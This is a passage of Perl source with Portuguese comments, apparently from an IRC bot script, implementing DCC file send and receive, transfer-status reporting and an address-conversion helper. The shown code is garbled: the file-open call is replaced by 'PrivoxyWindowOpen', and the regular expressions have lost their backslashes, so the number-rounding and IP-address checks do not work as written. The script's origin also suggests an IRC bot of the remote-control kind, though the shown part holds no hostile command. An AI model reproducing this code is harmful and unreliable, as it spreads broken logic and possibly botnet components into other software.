  $DCC{$sendsock}{bytes} = $size_total;
  $DCC{$sendsock}{arquivo} = $arquivo;


  &::ctcp("$nick", "DCC SEND $dccark $longip $porta $size_total");

}

sub GET {
  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;
  return(0) if (-e "$arquivo");
  if (PrivoxyWindowOpen(FILE, "> $arquivo")) {
     close FILE;
  } else {
    return(0);
  }

  my $dccip=fixaddr($dcclongip);
  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);
  my $dccsock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);
  $dccsock->autoflush(1);
  $dcc_sel->add($dccsock);
  $DCC{$dccsock}{tipo} = 'get';
  $DCC{$dccsock}{itime} = time;
  $DCC{$dccsock}{nick} = $nick;
  $DCC{$dccsock}{bytes} = $bytes;
  $DCC{$dccsock}{curbyte} = 0;
  $DCC{$dccsock}{arquivo} = $arquivo;
  $DCC{$dccsock}{ip} = $dccip;
  $DCC{$dccsock}{porta} = $dccporta;
  $DCC{$dccsock}{status} = "Recebendo";
}

# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas
sub Status {
  my $socket = shift;
  my $sock_tipo = $DCC{$socket}{tipo};
  unless (lc($sock_tipo) eq "chat") {
    my $nick = $DCC{$socket}{nick};
    my $arquivo = $DCC{$socket}{arquivo};
    my $itime = $DCC{$socket}{itime};
    my $ftime = time;
    my $status = $DCC{$socket}{status};
    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});

    my $d_time = $ftime-$itime;

    my $cur_byte = $DCC{$socket}{curbyte};
    my $bytes_total =  $DCC{$socket}{bytes};

    my $rate = 0;
    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;
    my $porcen = ($cur_byte*100)/$bytes_total;

    my ($r_duv, $p_duv);
    if ($rate =~ /^(d+).(d)(d)(d)/) {
       $r_duv = $3; $r_duv++ if $4 >= 5;
       $rate = "$1.$2"."$r_duv";
    }
    if ($porcen =~ /^(d+).(d)(d)(d)/) {
       $p_duv = $3; $p_duv++ if $4 >= 5;
       $porcen = "$1.$2"."$p_duv";
    }
    return("$sock_tipo","$status","$nick","$arquivo","$bytes_total", "$cur_byte","$d_time", "$rate", "$porcen");
  }


  return(0);
}


# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)
sub fixaddr {
    my ($address) = @_;

    chomp $address;     # just in case, sigh.
    if ($address =~ /^d+$/) {
        return inet_ntoa(pack "N", $address);
    } elsif ($address =~ /^[12]?d{1,2}.[12]?d{1,2}.[12]?d{1,2}.[12]?d{1,2}$/) {
        return $address;
    } elsif ($address =~ tr/a-zA-Z//) {                    # Whee! Obfuscation!
        return inet_ntoa(((gethostbyname($address))[4])[0]);
    } else {
        return;
    }
}









